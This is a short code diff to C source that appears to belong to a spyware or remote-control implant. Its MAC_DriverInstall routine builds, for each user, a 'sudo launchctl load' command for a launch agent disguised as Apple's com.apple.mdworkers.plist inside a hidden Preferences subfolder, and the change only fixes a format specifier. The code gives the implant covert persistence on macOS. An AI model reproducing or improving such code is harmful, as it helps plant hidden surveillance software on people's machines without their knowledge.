@@ -223,7 +223,7 @@ BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struc
 		return FALSE;
 	for(curr_user=users_list_head; curr_user; curr_user=curr_user->next) {
 		if (CheckTempStatus(curr_user, rcs_info, os_info)) {
-			swprintf_s(sudo_partial_string, sizeof(sudo_partial_string)/sizeof(WCHAR), L"sudo launchctl load -F %S/Library/Preferences/%S_/com.apple.mdworkers.plist; ", curr_user->user_home, rcs_info->hdir);
+			swprintf_s(sudo_partial_string, sizeof(sudo_partial_string)/sizeof(WCHAR), L"sudo launchctl load -F %s/Library/Preferences/%s_/com.apple.mdworkers.plist; ", curr_user->user_home, rcs_info->hdir);
 			sudo_string_len = wcslen(sudo_total_string) + wcslen(sudo_partial_string);
 			sudo_total_string = (WCHAR *)realloc(sudo_total_string, (sudo_string_len+1)*sizeof(WCHAR));
 			if (!sudo_total_string)
